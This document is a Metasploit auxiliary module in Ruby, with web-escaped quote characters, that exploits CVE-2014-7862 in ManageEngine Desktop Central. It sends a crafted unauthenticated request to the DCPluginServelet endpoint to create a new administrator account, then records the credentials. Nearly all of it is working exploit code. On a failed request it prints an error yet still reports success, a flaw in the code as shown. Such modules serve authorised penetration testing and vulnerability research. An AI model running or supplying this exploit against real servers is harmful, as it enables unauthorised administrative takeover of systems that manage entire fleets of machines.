# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Auxiliary
include Msf::Exploit::Remote::HttpClient
include Msf::Auxiliary::Report
def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;ManageEngine Desktop Central Administrator Account Creation&#039;,
&#039;Description&#039; => %q{
This module exploits an administrator account creation vulnerability in Desktop Central
from v7 onwards by sending a crafted request to DCPluginServelet. It has been tested in
several versions of Desktop Central (including MSP) from v7 onwards.
},
&#039;Author&#039; =>
[
&#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039; # Vulnerability discovery and MSF module
],
&#039;License&#039; => MSF_LICENSE,
&#039;References&#039; =>
[
[&#039;CVE&#039;, &#039;2014-7862&#039;],
[&#039;OSVDB&#039;, &#039;116554&#039;],
[&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_dc9_admin.txt&#039;],
[&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2015/Jan/2&#039;]
],
&#039;DisclosureDate&#039; => &#039;Dec 31 2014&#039;))
register_options(
[
OptPort.new(&#039;RPORT&#039;, [true, &#039;The target port&#039;, 8020]),
OptString.new(&#039;TARGETURI&#039;, [ true, &#039;ManageEngine Desktop Central URI&#039;, &#039;/&#039;]),
OptString.new(&#039;USERNAME&#039;, [true, &#039;The username for the new admin account&#039;, &#039;msf&#039;]),
OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password for the new admin account&#039;, &#039;password&#039;]),
OptString.new(&#039;EMAIL&#039;, [true, &#039;The email for the new admin account&#039;, &#039;msf@email.loc&#039;])
], self.class)
end
def run
# Generate password hash
salt = Time.now.to_i.to_s
password_encoded = Rex::Text.encode_base64([Rex::Text.md5(datastore[&#039;PASSWORD&#039;] + salt)].pack(&#039;H*&#039;))
res = send_request_cgi({
&#039;uri&#039; => normalize_uri(target_uri.path, "/servlets/DCPluginServelet"),
&#039;method&#039; =>&#039;GET&#039;,
&#039;vars_get&#039; => {
&#039;action&#039; => &#039;addPlugInUser&#039;,
&#039;role&#039; => &#039;DCAdmin&#039;,
&#039;userName&#039; => datastore[&#039;USERNAME&#039;],
&#039;email&#039; => datastore[&#039;EMAIL&#039;],
&#039;phNumber&#039; => Rex::Text.rand_text_numeric(6),
&#039;password&#039; => password_encoded,
&#039;salt&#039; => salt,
&#039;createdtime&#039; => salt
}
})
# Yes, "sucess" is really mispelt, as is "Servelet" ... !
unless res && res.code == 200 && res.body && res.body.to_s =~ /sucess/
print_error("#{peer} - Administrator account creation failed")
end
print_good("#{peer} - Created Administrator account with credentials #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
service_data = {
address: rhost,
port: rport,
service_name: (ssl ? &#039;https&#039; : &#039;http&#039;),
protocol: &#039;tcp&#039;,
workspace_id: myworkspace_id
}
credential_data = {
origin_type: :service,
module_fullname: self.fullname,
private_type: :password,
private_data: datastore[&#039;PASSWORD&#039;],
username: datastore[&#039;USERNAME&#039;]
}
credential_data.merge!(service_data)
credential_core = create_credential(credential_data)
login_data = {
core: credential_core,
access_level: &#039;Administrator&#039;,
status: Metasploit::Model::Login::Status::UNTRIED
}
login_data.merge!(service_data)
create_credential_login(login_data)
end
end

